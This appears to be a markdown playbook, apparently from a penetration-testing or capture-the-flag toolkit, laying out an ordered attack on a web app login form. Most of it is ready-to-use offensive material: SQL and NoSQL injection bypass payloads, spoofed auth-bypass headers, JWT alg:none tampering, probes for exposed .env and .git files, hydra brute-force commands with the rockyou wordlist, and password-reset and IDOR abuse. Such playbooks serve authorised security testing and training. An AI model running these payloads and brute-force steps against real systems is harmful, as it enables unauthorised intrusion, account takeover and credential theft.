# Archetype: Generic Webapp With Login

**Match if you see:** A login form, no obvious framework fingerprint, or a
custom-built app. This is the catch-all when nothing else matches.

## Order of operations (DO NOT SKIP)

The biggest failure mode is going straight to brute force. **Brute force is
last resort.** Try these *in order*:

### 1. Source-dive FIRST (if it's open-source)
```bash
# Identify the framework from JS bundles, page comments, headers
curl -sI http://target/
curl -s http://target/ | grep -iE "(generator|powered by|x-powered-by)"
# Bundle name often gives it away
curl -s http://target/static/js/main.*.js | head -1
```
If open-source → `bash scripts/source-dive.sh <repo> <tag>` BEFORE anything else.

### 2. Auth bypass before brute force
```bash
# SQL injection in login
' OR '1'='1
admin'--
admin' #
" OR ""="

# NoSQL injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}

# JSON-vs-form parser confusion (Express + body-parser)
# Send JSON when API expects form, with array values
{"username[]": "admin", "password[]": "x"}

# Auth-bypass headers
curl -H "X-Forwarded-For: 127.0.0.1" http://target/admin
curl -H "X-Original-URL: /admin" http://target/
curl -H "X-Rewrite-URL: /admin" http://target/
curl -H "X-Request-From: 127.0.0.1" http://target/api/...

# Method override
curl -X POST -H "X-HTTP-Method-Override: GET" http://target/admin

# JWT none algorithm (if JWT in cookies)
# Re-sign as alg:none with same payload
```

### 3. Forgotten endpoints / debug routes
```bash
curl http://target/.env
curl http://target/.git/config
curl http://target/.git/HEAD
curl http://target/server-status
curl http://target/phpinfo.php
curl http://target/debug
curl http://target/api/debug
curl http://target/console
curl http://target/_debugbar
curl http://target/__debug__/
curl http://target/.well-known/
```

### 4. Hidden parameters (only after default and source dive)
```bash
timebox.sh 60 arjun -u http://target/login.php
timebox.sh 60 arjun -u http://target/api/login -m POST
```

### 5. Account registration / password reset abuse
- Is there `/register` or `/signup`? Try registering with admin emails:
  `admin@<target-domain>`, then resetting `admin`'s password.
- Password reset that emits a token in the URL? Test for IDOR (substitute uid).
- Race conditions on registration (parallel POSTs).

### 6. THEN brute force, with a budget
```bash
# Small targeted lists FIRST
timebox.sh 60 hydra -L users-from-recon.txt -P common-10.txt http-post-form ...

# If that misses, ONLY THEN consider rockyou — and still timebox it
timebox.sh 90 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ...
```
**Hard rule: 90 seconds total brute force budget across all attempts.**
After 90s of fruitless brute force across this engagement, MOVE ON.

## Recon for usernames (do BEFORE brute force)

```bash
# Team page / about page
curl -s http://target/team http://target/about http://target/contact \
  | grep -oE '\b[A-Z][a-z]+ [A-Z][a-z]+' | sort -u

# JS bundle leaks
curl -s http://target/static/js/main.*.js | grep -oE '"[a-z._-]+@[a-z.-]+"'

# robots.txt + sitemap.xml
curl -s http://target/robots.txt
curl -s http://target/sitemap.xml

# Subdomain takeover candidates → leak old creds
```

## Common pitfalls

1. **Hydra without recon usernames** — wastes 5+ minutes on `admin/root`.
2. **Stopping at "needs auth"** — source dive, header bypass, registration,
   password reset all come BEFORE giving up.
3. **Trusting SPA size matches** — every dir-bust hit returns 3142 bytes.
   Check actual content.
4. **Not testing both JSON and form bodies** — many APIs parse them
   differently and one bypasses auth.

## Pivot once authenticated

- Check session cookies for IDOR (`session_id=1` → `session_id=2`)
- Check JWT for weak signing (`alg:none`, weak HMAC secrets via `jwt_tool`)
- Look for file upload, XML parsers, deserialization, eval-style sinks
- Admin panels often run separately on a different port — recheck nmap
